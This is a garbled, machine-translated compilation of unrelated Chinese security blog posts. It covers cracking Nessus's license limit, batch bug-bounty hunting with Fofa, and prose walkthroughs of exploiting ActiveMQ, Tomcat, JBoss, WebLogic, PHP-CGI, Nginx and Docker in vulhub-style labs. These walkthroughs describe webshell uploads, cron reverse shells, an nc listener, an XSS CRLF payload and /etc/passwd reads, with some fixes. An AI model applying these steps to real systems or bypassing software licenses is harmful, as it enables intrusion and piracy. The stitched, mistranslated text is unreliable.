We will next demonstrate the method process of installing Nessus on the penetration Kali system and cracking the latest version of Nessus into unlimited use.

Continue selecting the Tenable. for the Managed byFor sc, click on Continue.

Register your account password here, and then log in.

An update initialization of the Plugins vulnerability plug-in occurs after the login.

After the initialization is completed (about 7~8 minutes), you can see that only configuration, no scanned IP restrictions, which need to import Linsence and update packages will display.

Install Linsence and update package requires two values here to apply to download the Linsence and update package on the official website.

Query Challenge value: The command: / opt/nessus/sbin/nessuscli fetch--challenge obtains the first value through the above command.

Then visit to: https://zh-cn.tenable.com/products/nessus/nessus-essentials?tns_redirect=true here is actually registered in the front, log in.

View the mailbox mail for a second value.

Fill in the two values in order, and click Submit.

You can see that the update package and Linsence. appear

You can see that after the nessus initialization completes, the license limit only supports 16 IP's and starts to crack.

Then it will be the plugin_feed_info.The inc file is put in: After you put it in the directory, you restart the nessus:service nessusd restart and find the same as before, and the plugin in the / opt/nessus/lib/nessus/plugins/ directory is missing.

Although the perfect weapon plug-in removes the ip limit, the weapon vulnerability plug-in is missing. Now copy back the copied plug-in folder before: drag in and wait for the move to paste to complete, and restart the nessus after completion.

The login page continues to initialization after the restart.

Wait for the initialization to complete the login interface, and successfully crack the unlimited version. Since Nessus is all English version, many people operate very unfamiliar, so continue to demonstrate the installation of Chinese and google browser for translation.

When determined, it will be the zh_CN.UTF-8 is the default and reboot can restart kali.

Simple demonstration Nessus leaky tap click top right corner to create new scan-forward scan.

Fill in the IP or IP segment that it needs to scan.

You can see 41 medium-and high-risk security vulnerabilities scanned.

Since the Nessus service will reset plugin_feed_info. every time it startsThe inc, which will make all the plugin in the nessus/plugins directory deleted and cannot be scanned.

I have repeated several times, but also cracked several latest versions of different stages, are directly cracked no problem, in the company to use Nessus is also a good choice.

The vulnerability may allow remote code execution if the user receives a special RPC request on the affected system.

On Microsoft Windows 2000, Windows XP and Windows Server 2003 systems, an attacker may be unauthenticated to run any code using this vulnerability.

This vulnerability may be used for worm attacks.

Firewall best practices and standard default firewall configurations help protect network resources from attacks from outside the enterprise.

View the current working path of the target machine with pwd, and view the I P address configuration with the ipconfig command.

This project is an online vulnerability scanning system based on the Flask application framework, and integrates port scanning and subdomain blasting commonly used in penetration testing. Back-end vulnerability scanning uses Pocsuite., an open source vulnerability testing framework that knows the Chuangyu security team

Scanning target can only be a single IP or URL, does not support the network segment scan, the default has more than 80 plugins, mostly Seebug free PoC task cycle can choose temporary, daily, weekly or monthly asset management to add each system or department network assets can create a vulnerability scanning task through each asset database, the same asset library can only be a single IP or URL.

Many people want to study their operating mechanisms but can not be solved because of the closed source.

Today here is an extremely simple way to give you a glimpse of its core code with just a few lines of code.

This is the latest decoding method, no need to install any dependence except python3, support 11.x,12.x,13.x, and subsequent versions of ^ _ ^, is very helpful for students who have IAST, DAST scanner needs.

Security practitioners can also learn from the industry's top scanning technology; for strong hands-on students, you can also automatically add plug-ins to AWVS by learning these lines of code.

Simple understanding: Similar to squeezing the files using the ZIP tool.

So in the new version, using the word decryption is the little bit inaccurate, exactly decoding (decode) rather than decryption (decrypt).

Use the method wvsc_blob.The bin files are generally found in the " C:\\Program Files (x86) \ \ Acunetix XXX \ \ core \ \ wvsc_blob.The bin " will be the wvsc_blob.Put the bin file in the same directory as the script, execute the script, and output it in the directory starting with 'awvs_script_blob_decode_'.
Directory interpretation awvs uses the Google V8 engine to perform the javascript scan script in the / Scripts/ directory ".The script "suffix file,".The script "file" # include" contains files in the / Scripts/Includes directory, loaded with macro replacement, not require.

There is also a concern, to get the AWVS vulnerability description file: very simple, use the database connection tool to connect to the pgsql after dump, the user name and password in the application configuration directory to find, generally in the / AppData/ hidden directory core code only simple 15 lines of code.

Five lines of code are really thin.

The final effect is: only a Fofa search syntax, can dig out for public SRC vulnerability process includes: 1, early information collection (FOFA) 2, interim vulnerability verification (Python batch script) 3, later IP backcheck (Python batch script) this use "user U8 OA SQL injection vulnerability" to demonstrate the whole automation process.

The POC of this vulnerability is very simple, directly attached here, details need there are many online.

POC: Information Collection It is well known that information collection is the most critical link in penetration testing.

In the stage of information collection stage, our main goal is: 1, find the online vulnerability POC2, find out the IP list that may exist. Here I recommend 2 vulnerability libraries that I often visit first.

The text begins this time with the Fofa search engine to collect a possible vulnerability in the IP.

Fofa statement: Considering the subsequent need to export the I P list collected by Fofa to the script batch validation, it is easy to use the Github open source tool Fofa-collect. Just configure your Fofa mailbox and API, you can just enter the Fofa syntax, and get the query results.

My use process is as follows: 1. Enter Fofa syntax in Fofa-collect-> get IP:PORT list 2, export and save as IP.By txt at this point, the information collection process ends.

POC Batch Validation POC Batch Verification stage Our main goal is: to write or use POC, find out the original IP P O C link in the IP list can see a flawed URL in the running results, and has been deposited in urls.txt 。

Actually the article here, can prove the vulnerability exists, but according to my vulnerability box brush public SRC experience, SRC vulnerability need clearly belong to unit, only ip or non-clear unit of domain name is not included, so light IP is not enough, we need to put these loopholes of IP, through IP check domain name, find out the domain name, and find out the domain name unit, so that can be a vulnerability can be submitted.

For example, you dig out the IP address 39.156.69.69.79, but generally not, you need to find out that the domain name corresponding to this IP 39.156.69.79 is baidu.The com, while the baidu.The unit behind the com is Baidu company, which submits the IP, domain name, company name and these information together, so there is the next module, batch IP backcheck.

Why not use the existing POC batch tools?I have learned that POC-T is a great POC batch validation tool and g o s o n format in goby, which are very efficient and convenient.

But I think I learn a long time, to try to learn from the basic, which needs to write code, understand the logic at the bottom of those tools.

Maybe in the eyes of some big guys, my small project is a suture monster, but I think this is a record of my learning, and I hope to love.

For example, the H o o k tools on the Android platform, there are those like Xposed, they usually can only Hook on the Java layer, every time you modify the logical code, update the Apk on the target device, always feel a little inconvenient to use.

Frida is different, not only supports H o o k for Java layer, but also supports Hook of Native layer so library files, and every time you modify the logic, also do not need to install a new A p k to the target device, because its Hook logic does not need to be packaged into Apk, write the logic can directly run the effect, very convenient, save a lot of time and improve work efficiency.

In addition, Xposed can only Hook Android, and Frida is all systems, including Windows, iOS, Linux, Android, the best choice for Hook.

These commands can enable passive data collection and disclosure, or be used to actively perform actual operations that affect the cluster.

These commands were mapped to MITRE ATT&CK Tactics to help the majority of security researchers understand cluster security gaps.

The current version of Red-Kube is encapsulated to use the python module to run multiple commands in a single task execution based on different scenarios or policies.

Cloud native technologies, which can effectively solve these "pain points", are booming, becoming an important driving force for enabling business innovation, and have been applied to enterprise core businesses.

However, while the cloud native technology creates benefits, it also faces serious security problems. The main content of this article is to briefly analyze the cloud native security problems and defense technology.

Note: CNCF defines cloud native as " cloud native technology helps organizations to build and operate elastic extensible applications in new dynamic environments such as public cloud, private cloud and hybrid cloud.

Cloud-native representative technologies include containers, service grids, microservices, immutionable infrastructure, and declarative API.

These techniques are able to build loose coupled systems that are fault tolerant, manageable and easy to observe.

Combined with reliable automation, cloud native technology enables engineers to easily make frequent and predictable significant changes to the system."Cloud native technology is booming, and the cloud native panorama of CNCF is shown in Figure 1.

Important attack surfaces that an attacker may exploit include, but are not limited to,: container runtime, container orchestration platform, microservice architecture Web applications, service grid, Serverless.

When containers run, we will first look at the market situation. According to 2020 statistics, Docker's market share was 50% (down more than 29% compared with 2019), while CRI-O market rose from 4% to 17%.

Then the security problem analysis, with Docker as an example of the container runtime, as shown in Table 1.

In order to achieve a good balance between lightweight and safety, some research teams have landed "safety containers" based on "traditional containers" and provide additional protection between "container-host" or "container-container".

Typical "security container" techniques include Kata, gVisor, Firecracker,, but they are still at risk of known or unknown container escape attacks.

First of all, look at the market situation. According to the 2020 data statistics, Kubernetes's market share was 75%, while OpenShift's 9% share in the previous year was increased to 15%.

Thus, K8s has become the current factual standard of container arrangement in the industry.

Then conduct the security problem analysis, and take K8s as an example for the security problem analysis of the container arrangement platform.

As we can see from the graph, there are many means for hackers in the process of attacking the K8s cluster, and the attack surface of the K8s cluster is large.

For example, for micro-service Web applications, the OWASP Top10 and other security vulnerabilities faced by traditional single applications still exist, and affected by the characteristics of the architecture, the risk of sensitive information leakage, invalid identity authentication and invalid access control becomes more prominent.

Service Grid Platform Security Issues As an architecture mode of cloud native application, the service grid responds to the challenges of network and management in micro-service architecture, and also promotes the development of technology stack hierarchical architecture.

From distributed load balancing, visibility of firewall services, the service grid avoids service fragmentation by providing communication layers at various architecture layers, solves the workload problem across clusters in a secure isolation manner, and extends beyond Kubernetes container clusters to services running on bare machines.

Service grid and micro services are complementary in the cloud native technology stack, the former focuses more on the delivery and operation of applications, the latter focuses more on the application design and development.

Without two-way TLS authentication in the service grid, the SES is vulnerable to intermediary attacks.

If not done east-west, north-south certification authentication, services are vulnerable to overreach attack.

Serverless(Serverless operations), also known as functions as services (Function-as-a-Service, abbreviated FaaS), is a model of cloud computing.

Based on the platform is service (PaaS), no server operations provides a micro architecture, end customers do not need to deploy, configure or manage server services, code operation server services required by the cloud platform, Serverless makes the underlying operations workload further reduced, business online, also need not worry about server operations, but all to the cloud platform or cloud manufacturers.

Similar to conventional monomic applications, Serverless applications are vulnerable to typical Web attacks.

Moreover, in this particular application scenario, Serverless users may suffer financial losses from denial of service attacks from such as DoW platform accounts.

Cloud native security defense technology analysis for the cloud native security problem defense, the industry has put forward different practical methods.

For example, Green League security researchers believe the following three principles: (1) security left shift: more security investment into development security, including security coding supply chain (software library, open source software) security, mirror security; (2) focus on "unchanged": container corresponding mirror, file system are all unchanged, the same or inherited mirror container processes and their behaviors are similar, container processes for microservices are few and their behavior is predictable, can be painted through learning; (3) business security: protect the most final value and at the top of the business.

ByteDance security researchers also pointed out that the three core elements of the Internet should be focused on defense work: computing, storage and network, with the following views: (1) the essence of container security is the full use of Linux Kernel security mechanism; (2) eBPF technology will flourish and be widely used in syscall and network monitoring; and (3) the focus on the whole process construction of acquisition, visualization, association analysis and response.

At present, Tencent Security has built a complete cloud native security protection system including five fields, including security governance, data security, application security, computing security, and network security.

After the above analysis, it can be found that the governance of "cloud native security" needs a comprehensive solution.

The author believes that in the process of the construction of the cloud native security protection system should do the following work: (1) combined with the specific landing of the cloud native technology to carry out and implement the minimum authority, depth defense work for various components of the cloud native environment, can implement the principle of "security left shift", security baseline configuration, prevent in the bud.

We should pay attention to "configuration security" in the whole life cycle of the container, "mirror security" in project construction, pay attention to "container access" in project deployment, and pay attention to the security issues of cloud computing, "computing", "network" and "storage" in the operation environment of the container.

The core job of the asset inventory is the asset version alignment.

Asset version alignment facilitates defense work; defense includes baseline compliance and asset reinforcement.

In specific practice, the logs of business container can be sent to the big data platform for analysis and alarm; emergency response should be paid in defense.

In the specific practice, if the production environment is found to be attacked, should be carried out timely emergency response, beware of harm expansion.

Transformation and comprehensive application of existing cloud security technology should not regard "cloud native security" as an independent proposition, and host security, microisolation and other technologies that provide more support for the cloud native environment can enable cloud native security, as shown in Figure 5.

However, the cloud native environment is facing severe security problems, and the security technology needs to be developed urgently.

It is expected that the cloud native security technology will develop rapidly in the next 24-36 months.

After comparison, it can be found that the cloud native security technology and the traditional cloud security technology have similarities and differences."Cloud native security" governance requires integrated solutions.

When landing the cloud native security technology, it can be considered from the following aspects: the specific implementation situation of the unit, the life cycle of the cloud native application, the security operation and maintenance standards, and the transformation and comprehensive application of the existing cloud security technology.

Security must serve the business.

When the business needs to be modernized, security also needs to change with the trend, and do not become obstacles to the business.

In the era of cloud native, DevSecOps concepts and products will gradually be applied.

Cloud native security and information infrastructure will be deeply integrated, and providing SECaaS will also become a major development trend.

fileserver is a RESTful API interface where we can read and write the stored files through an H T T P request like GET, PUT, DELETE, designed to compensate for the defect that the message queue operation cannot transmit and store binary files.

During the test, you can follow the version of ActiveMQ to avoid detours.

This vulnerability appears in the fileserver application. The vulnerability principle is actually very simple: fileserver supports writing to files (but not resolving jsp), while supporting mobile files (MOVE requests).

So we just need to write one file and then use MOVE to request to move it anywhere causing any file write vulnerability.

There are several ways to use file writing: write webshell write cron or ssh key file write jar or jetty.The advantage of libraries like xml and profiles writing to webshell is that the low threshold is more convenient, but also mentioned that fileserver does not parse both jsp,admin and api apps need to login to access, so a bit.

The advantage of writing cron or ssh key, is a direct rebound to take shell,, the disadvantage is the need for r o o t permissions.

What is the rebound shell simply the rebound shell (reverse shell) is the reverse shell, is a concept relative to the standard shell.

The standard shell is the attacker as the client to connect to the target server; the rebound shell is the attacker as the server, listening to a port, and the target device as the attacker actively connects to the client.

rebound shell application scenario: target machine in LAN target ip address is dynamic firewall restrictions, target machine can only send request, cannot request is not sure when the target machine has the connection conditions for this part of the main reference: rebound shell principle and implementation as for the specific rebound shell baidu search is all, don't say.

Relationship between cron or ssh key and rebound shell The relationship between cron and rebound shell is well understood, is to write rebound shell script into the timing task file of the target machine; the relationship between ssh key and rebound shell, according to the information found online, writes the ssh key(public key to the target machine), the attack machine can log in to the target machine.

But this is not still the attack machine do client, the target machine do server?Or need the target machine to turn on the ssh service, and allow the attack machine to connect, and has little to do with the rebound.

The jetty is configured via an API or XML file while the jetty.The xml is an important profile for the jetty.

In the linux file permissions vulhub website tutorial, at least two words mention permission-related issues: This method requires the ActiveMQ run as root,otherwise it will not be able to write to the cron file.This method requires ActiveMQ to be root run otherwise cannot write to cron file.

In some cases, the jetty.All of the xml and jar are users of the web container, so the write crontab success rate is a bit higher than that.

In short, because files are uploaded via ActiveMQ, the user running ActiveMQ must have a target folder, or write permissions to the file that needs to be modified.

To determine if you can write or modify a file, you need to determine two things: / right below the user whose file or folder permissions run the ActiveMQ at / etc/cron.The d directory and the jetty.The xml file to demonstrate how to get the above two points of information.

While the jetty. can be seen from the figure belowThe owner of the xml file is also the root,root user permissions are read and write and other user permissions are readable.

Users running ActiveMQ, I think of two ways to view the user running ActiveMQ: the first is no ps command through the ps command container. You need to install the following command and view the users running activemq console with the following command. From the figure below, the user running ActiveMQ is root.

According to the background brief on vulhub, the vulnerability impact version is ActiveMQ before 5.14.0.

Since it is the vulnerability recovery environment provided by vulhub, That version must be fine, But if you want to confirm the version, http://your-ip:8161/admin/ access with the browser 1: Write webshell prerequisite to know that the absolute path of ActiveMQ needs to be able to login admin or api idea analysis because the above two prerequisites should be met, And the absolute path of ActiveMQ can pass through http://your-ip:8161/admin/test/systemProperties.The jsp page gets and this page also needs to log into admin to access.

I can think of several ways to get the user name and password: try the default user name and password try weak password (violence crack) social worker violence crack can use Burp Suite intruder module, because not this strong related content, here is not occupy space, before I wrote Burp Suite blasting Basic authentication password is based on the vulnerability environment, can refer to.

If you want to violently break the username and password at the same time, you can refer to this blog, write very clearly use Burp suite blasting HTTP Basic authentication 2, get the absolute path of ActiveMQ to get the username and password of the admin application, you can access the web http://your-ip:8161/admin/test/systemProperties.For jsp to get the absolute path of ActiveMQ, see the red box below.

This page has a lot of interesting information, here is not expand.

Uploading the webshell has to upload the webshell to the fileserver, before transferring from the fileserver.

Since ActiveMQ is a java program, a jsp webshell. needs to be passed on

Found an jsp webshell: ant sword jsp Trojan horse with PUT method to upload webshell to fileserver:Response message status code 204 to indicate upload success: 4, Move webshell to the folder where admin is located to move webshell with MOVE method Similarly, Response message status code 204 indicates mobile success: 5. Connect webshell here with ant sword, The point is to remember that the admin app needs to log in, So remember to be sure to add the Authorization header to the connection.

The user writing the ssh key prerequisite to run ActiveMQ has root permission requires the server to open the ssh service, and the attack machine can connect the feasibility judgment For the above condition 1, in the knowledge extension section that the user running ActiveMQ is root and condition 1 is satisfied.

The nmap command: your-ip is the result of the ip address scan for the vulnerability environment: visible from the scan results, the server can only reach 8161 and 61616 ports, condition 2 is not satisfied, this road is blocked.

Write cron take rebound shell prerequisite needs to run ActiveMQ user has root permission server opened cron service running ActiveMQ users have permission to use crontab the first two points have been proven to meet in the knowledge expansion and point 3 is satisfied by default unless there is cron.A l l o w or cron.The deny files, but both files do not exist in the vulnerability environment provided by vulhub.

So this environment can theoretically rebound shell. by writing cron

This is not realized in the following exploit process.

During testing I also tried the cron file in writing bash rebound shell, but the rebound shell was not executed successfully and what is not known for the reason.

Online search for cron rebound shell information, found that someone in other environments trying to bash rebound shell was also unsuccessful.

In case there is no soft link of perl on the server, you need to write the absolute path of perl, for example, / usr/bin/perl Also note that the $ i in the rebound shell is the attacker ip, and the $p is the port that the attacker listens to.

The Response message status code 204 indicates a successful file upload 2. Transfer the cron file from fileserver to / etc/cron.The d / ele transfers the file with the MOVE command, with the payload as follows: The Response message status code 204 indicates a successful file transfer.

Attack machine on listen and wait for rebound shell connection attack machine with nc on listen, listen to 7777 port, the command is as follows: wait patiently (within 1min), you can connect to the server way.

revise jetty.The xml prerequisite requires to know that the absolute path of the ActiveMQ needs to have a jetty.The xml write permission idea analysis uses this method, primarily used to break through the access control limits of admin applications and api applications.

The idea that the vulhub gives is to modify the jetty.The xml file so that admin and api applications without login and then write to webshell.

I think you can also modify the jetty-realm.User user password in the properties file, however due to jetty.User name is limited in xml, so modify jetty-realm.The method of properties files also requires a premise is to know the user name, compare the two, but actually modify the jetty.xml much better.

Using this approach, the complete attack chain is: get the absolute path to upload the modified jetty.The xml file to the fileserver transfer is uploaded by the jetty.Absolute path / conf/jetty. of the xml file to the ActiveMQThe xml, to cover the original jetty.The xml file that aims to bypass user authentication for admin and api applications.

Upload webshell to fileserver Transfer webshell to admin or api app Connect webshell Use steps Write above: There is no restoration of this method on vulhub, I tried in the vulnerability environment provided by vulhub, though jetty.The xml file can be modified successfully, but the modification does not take effect, and trying to log in to the http://your-ip:8161/admin/ on the web page will still pop up the HTTP Basic authentication box.

Even later deleted the jetty.The xml is also completely unaffected.

Later also tried stop start ActiveMQ, again strange is after ActiveMQ stop, http://your-ip:8161 can also log in as usual.

So I currently suspect that the vulnerability environment is a problem, but I'm not very clear what is wrong.

So put the jetty. firstThe xml file modification ideas write down, if it is necessary to build the environment to restore this vulnerability or similar vulnerability, then it is good to have a reference.

If any passing god knows what the problem is or successfully in the vulnerability environment provided by vulhub requires admin applications to require user authentication, only write to modify jetty. belowThe xml-related steps, and the relevant commands used to troubleshoot the problem.

If webshell is in a folder that needs to log in, you also need to know the username and password.

Use the MOVE method carefully.

File upload feature requires access control.

The uploaded files need to be filtered against them.

The destination folder for uploading the file requires preferably not to have permission to execute the code.

Originally an optional package for the Windows NT version, later built in with Windows 2000, Windows XP Professional and Windows Server 2003, there was no I I S on the Windows XP Home version.

The IIS is a Web service component that includes a Web server, an FTP server, an NNTP server, and an SMTP server, respectively, for web browsing, file transfer, news services, and mail delivery, making it easy to publish information on the web.

The security vulnerability of IIS has long been criticized by the industry, and the threat of remote execution vulnerability in IIS will be very serious.

The remote execution code vulnerability exists in the HTTP protocol stack when the HTTP.This vulnerability is caused when the sys does not correctly analyze a specially designed HTTP request.

An attacker who has successfully exploited this vulnerability can execute any code in the context of the system account and can cause the machine blue screen where the IIS server is located or to read confidential data in its memory.

This vulnerability can only determine the first six characters, and it is difficult to guess if the latter characters are too long and contain special characters.

If the file name itself is too short (no short file name) to guess.

If the top 6 bits of the file name are filled with space, the short file name in 8.3 format does not match the real file name.

When IIS6.0 handles the PROPFIND instruction, since the length has no effective length control and inspection of the url, memcpy causes the stack overflow, resulting in remote code execution.

If there is a file, test.The jpg, accessed later after /.By php, you can put the " test.jpg/.Give php "to php,php repair file path" test.jpg/.The php "get" test.jpg", the file exists and performs it as a php program.

Filtering the new directory file name does not allow the new ones to include '.'File.

The function of building a new directory in the curve website background, and building a new directory is not allowed.

Limit the uploaded script execution permissions and do not allow script execution.

filter.asp/xm.The jpg, was filtered by the ISApi component.

It can run on almost all widely used computer platforms, and is one of the most popular Web server-side software due to its widespread cross-platform and security usage.

It is fast, reliable and expanded with simple API to compile interpreters like Perl/ Python into the server.

The Apache file parsing vulnerability involves the feature of a parsing file: Apache default a file can have multiple point-separated suffixes, when the right suffix is not recognized, continue to the left, when we request such a file: shell.xxx.yyyphp-> found that the suffix is php and given to php to handle this file.

It is characterized by little memory and strong concurrency ability, and in fact nginx does perform well in the same type of web server.

Introduction and causes Add / any file name later to any file name.Parsing vulnerability for php such as the original filenname is test.The jpg, you can add test.jpg/x.The php performs a parsing attack.

Vulnerability Re-Now create a new one under the site root i.The file for gif, write phpinfo() in the browser, open the utilization file parsing vulnerability, enter 192.168.139.129:100 / i.gif.2.php, found unable to parse will / etc/php5/fpm/pool.d/www.security. in conflimit_extensions = .php hit the target.The php deletion was opened again in the browser and resolved successfully

Will php.The c g i in the ini file.The value of fix_pathinfo is set to 0. so that php in parsing a directory like 1.php/1.jpg displays 404 as long as 1.jpg doesn't exist;

Will / etc/php5/fpm/pool.d/www.security. in confThe value after the limit_ectensions is set to.php

Nginx directory traversal is like Apache, a configuration problem, the wrong configuration can lead to directory traversal and source code leakage.

The vulnerability reset opens the test directory and found that the modification / etc/nginx/sites-avaliable/default, cannot be opened to add autoindex on access again at the location shown in the figure below.

The vulnerability fix changed the autoindex on in / etc/nginx/sites-avaliable/default to autoindex off

Introduction of vulnerability and causes of "car return + line change" in CRLF.

The HTTP Header is separated by two C R L F's from the HTTP Body, and the browser removes the H T T P content according to the two CRLF's and displays it.

By controlling the characters in the HTTP message header and injecting some malicious change rows you can inject some session cookie or html code and the injection code is executed because Nginx is not configured correctly.

Vulnerability resume access page, packet request plus /%0d%0a%0d%0a <img src=1 onerror=alert (/ xss /)> There is no pop-up due to page redirection.

Nginx profile / etc/nginx/conf. for vulnerability fixThe d/error1.conf is modified to use the undecoded url jump.

The Tomcat Server is a free open source Web application server that belongs to a lightweight application server, is commonly used in small and medium-sized systems and concurrent access users for not many occasions, and is the preferred choice for the development and debugging of JSP programs.

For a beginner, it can be thought that when the Apache server is configured on a machine, it can be used to respond to access requests from the HTML page.

The Tomcat is actually an extension of the Apache server but runtime it s running standalone so when running the tomcat it actually runs separately as a process separate from the Apache.

The / conf/web. s under the tomcat folderThe xml file insert: Restart the tomcat service.

Visit 127.0.0.1:8080, burp grab the package, send to Repeater, changes the request mode to PUT, create a 122.jsp, and escape the space characters with%20.

The 123.jsp content is: return to 201, indicating the successful creation.

Visit the 127.0.0.1:8080/122.jsp?cmd=calc 。

Detects whether the current version is within the impact range, and disables the PUT method.

1. vulnerability ile and causes Tomcat supports deploying war files in the background to deploy webshell directly to the web directory.

If there is a weak password present on the background management page, you can get the password through blasting.

Create a dedicated Tomcat service user that has only a minimum set of permissions (for example, remote login is not allowed).

Increase local and certificate-based authentication (directory services are also configured for centralized authentication).

In the CATALINA_HOME/conf/web.The xml file sets the locking mechanism and the time timeout limit.

And set minimum access limits for directory pages such as manager-gui/manager-status/manager-script.

Background management avoids weak passwords.

The JBoss code follows the LGPL license and is freely available in any commercial application.

JBoss is a container and server that manages EJB and supports both EJB1.1, EJB 2.0 and EJB3 specifications.

But the JBoss core service does not include W E B containers supporting servlet/JSP and is generally used with Tomcat or Jetty binding.

Java serialization, in short, is the process of converting java objects into a byte sequence.

Antisequence is the process of restoring the byte sequence to a java object, but when this turn becomes changed, the programmer's filtering is not strict, which can lead to the implementation of the maliciously constructed code.

POST payload.Data in the bin.

View the target machine, pop up the calculator.

Effective solution: Upgrade to JBOSS AS7 version temporary solution: 1) http-invoker. is not requiredUsers of the sar component can directly remove this component; 2) for access control of the httpinvoker component.

The war backdoor file deployment.

The jBoss background management page has a weak password to obtain the account password through blasting.

Log in to the background to upload the war package containing the backdoor.

Click on Web Application (war) s.

Click on the add a new resource.

Select a war package to upload, after upload, enter that war package and click start.

View the status for the sucessful.

Visit the war package page and enter the back door.

File management and system command execution are available.

WebLogic is a applicationserver, from Oracle that is exactly a JAVAEE architecture-based middleware, a J a v a application server to develop, integrate, deploy, and manage large distributed Web applications, web applications, and database applications.

Introduce Java dynamics and the security of Java Enterprise standards into the development, integration, deployment, and management of large network applications.

Antisequence is the process of restoring the byte sequence to a java object, but when this turn becomes changed, the programmer's filtering is not strict, which can lead to the implementation of the maliciously constructed code.

Using the vulhub experimental environment, start the experimental environment, access the target machine, grab the packets, and modify the packets.

Kali starts the listening.

After sending the packet successfully, get the shell.

Upgrade the Oracle 10 month patch.

Access control over the resources that access the wls-wsat.
An S S R F vulnerability exists in Weblogic that allows you to send any HTTP requests to attack vulnerable components such as redis, fastcgi in the innet.

The vulnerability reuse uses the vulhub experimental environment to start the environment.

Visit the http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp 。

Grab the package with burp and modify the request.

Start nc listening for port 2222.

Get the shell.

The direct way to fix it is to put the SearchPublicRegistries.Remove the jsp directly.

The Weblogic services-side request forgery vulnerability appears in the uddi component, more precisely the uudi package implementation package uddiexplorer.The SearchPublicRegistries. under the warjsp 。

Install the wlserver_10.3/server/lib/uddiexplorer. in the weblogic installation directoryThe war makes the backup well.

Install the server/lib/uddiexplorer. in the weblogic installation directorywar download.

Open the uddiexplorer. with tools such as winrarwar 。

Under its SearchPublicRegistries.The jsp was renamed to the SearchPublicRegistries.jspx 。

Save it and upload it back to the service side to replace the original uddiexplorer.war 。

For clusters of multiple hosts, do this for each host.

Since there are caches in the t m p directory of each server, restart weblogic. completely after modification

By accessing the config.The do configuration page, change the Work Home working directory first, replace the default directory that stores the JKS Keystores files with a valid deployed Web application directory, and then use the "Add Keystore Settings" feature to upload malicious JSP script files.

Vvulnerability vulnerability access http://192.168.139.129:7001/ws_utc/config.do 。

After uploading, view the returned packet with a timestamp: you can see that the timestamp is 1543145154632.

Visit the http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp 。

File management, file upload, system command execution, etc.

Try the following to execute the system command.

The command was executed successfully.

Due to the weak password in the WebLogic background, you can directly log in the background to upload the war package containing the back door.

The http://192.168.139.129:7001/console logs in to the background with a weak password.

Click on Lock and Edit.

Select Deployment and click further on the right.

Click Upload File- -enter the file upload interface and select the war package to upload.

Go to the next step, select the corresponding war package for deployment, and the next step until completion.

Click to Activate the Change.

Start the service generated by the uploaded war package.

Get the webshell.

Vulnerability repair firewall settings port filtering, you can also set only IP lists to the background to avoid weak passwords in the background.

The vulnerability was reproduced using the vulhub experimental environment to start the experimental environment.

Use the command python fpm. in the attack machineThe py 192.168.237.136 /etc/passwd, observations return the results.

Due to access to the non- *.PHP file, so returns the result 403.

Use the command to execute a php file that exists by default.

Use command with arbitrary commands.

Call the p h p interpreter for explanation in apache.In the php file I pass the url parameter to the php interpreter and if passing the command line switch (such as-s, -d, -c or-dauto_prepend_file%3d/etc/passwd + -n after url) causes source cod e leakage and arbitrary code execution.

This vulnerability affects previous versions of php-5.3.12, mod, fpm, is unaffected.

Using the vulhub experimental environment, the the environment.

Visit the http://192.168.139.129:8080/index.php 。

Grab the packages, and modify the packages.

The command was executed successfully.

Three ways to fix the vulnerability: 1) upgrade the php version.

Focus on apache, turn on the url filter, and filter out the dangerous command-line parameters, because this method is easier to fix, use more.

Patphp.

The target site is built based on relatively new loopholes, and the quality is OK.

From the initial information collection, external network initial exploration, attack into the internal network, build an agent, horizontal movement, and finally win the domain control.

VMnet8 is set as the default NAT mode, IP segment is set to 192.168.52.0/24; VMnet14 is set to host-only mode, IP segment is set as 192.168.93.0/24: take VMnet8 as the network card for the second layer of network, and VMnet14 as the network card for the third layer of network.

This way, all hosts in the second tier network are available to the Internet, but all hosts in the third tier network are not connected to the external network.

DMZ area: Two network cards are configured for the Ubuntu, one bridging providing service externally; one connecting the second layer network on the VMnet8.

Second layer network area: Two network cards are configured for both Ubuntu and Windows 7, one connected to the second layer network on VMnet8, and one connected to the third layer network on VMnet14.

Third network area: Both Windows Server 2012 and Windows 7 have only one network card (PC 2), and one is connected to the third layer network on the VMnet14.

Extranet penetration assumes that the penetration target customer gives only one domain name: www.whopen.Below com, we want to penetrate the target network in the black box, and finally need to take the domain controller permission.

View Port 81: Discover it to be a Laravel site, a simple, open-source PHP Web development framework designed to implement the M V C architecture of Web software.

On 12 January 2021, Laravel was revealed that there was a remote code execution vulnerability (CVE-2021-3129).

When Laravel turns on Debug mode, due to the unsafe Ignition components of file_get_contents() and file_put_contents() functions, the attacker can trigger P h a r deserialization by initiating malicious requests, constructing malicious Log files, and eventually remote code execution.

Then for convenience, we can generate a Trojan using msf and then upload to the target host to get a metasploit meterpreter, specific step omitted.
The Docker runC vulnerability to escape it (CVE-2019-5736) was revealed in 2019.

The r u n c version used in the previous version of Docker 18.09.2 is less than 1.0-r c 6 and allows the attacker to rewrite the runc binary on the host and the attacker can execute commands as root on the host.

Using this vulnerability requires one of two conditions: A malicious mirror creation attacker controlled by an attacker has write permission to an existing container and is accessible via docker exec.

However, for some reason, we did not receive shell. from the target host after manually restart docker

So we can only escape in another way.

Docker Privilege Mode Escape privilege mode was introduced at version 0.6. Docker, allows the root in the container to have external physical machine root permissions, while previously the root users in the container only had external physical machine general user rights.

Launching the container in privilege mode gives you a large amount of device file access.

Because when the administrator performs the docker run —privileged, the Docker container will be allowed to access all the devices on the host and can execute the mount command for mount.

When controlling a container started using privileged mode, the docker administrator can mount the external host disk device into the container through the m o u n t command to obtain file read and write permissions to the entire host, and can also execute commands in the host by writing planning tasks.

We can execute the metasploit generated commands in the host by writing to the scheduled task.

Connecting the redis, on 192.168.1.8:6379 directly on the attack machine was successful. After all, it is the target machine, which is simple: with redis not authorized, then it is simple to use, we write the SSH public key directly to the target host.

Build ssh public key on the attacker: ssh-keygen-t rsa then import public key into key.txt document.

At this time to view the target machine network information, but found that the network connection information of the target host has all changed, and found that we just began to visit "192.168.1.8", there is another Intranet IP segment "192.168.52.1/24": the system release version has also become Ubuntu 18.04.5: seems that the target site should be a reverse proxy, that is to say, the Ubuntu 18 host only provides an agent service, the real Web server is the host Ubuntu 14 host we took before.

To confirm our conjecture, I checked the n g i n x profile on Ubuntu 18: as shown above, we found the flag of the nginx reverse proxy, —— "proxy_pass", knows that nginx on the Ubuntu 18 server forwarded the request received on port 80 to https://whoamianony.The top, forwarded the request received on port 81 to the Web server 192.168.52.20 of the Intranet layer 2 network, the host of our previous Getshell Ubuntu 14.

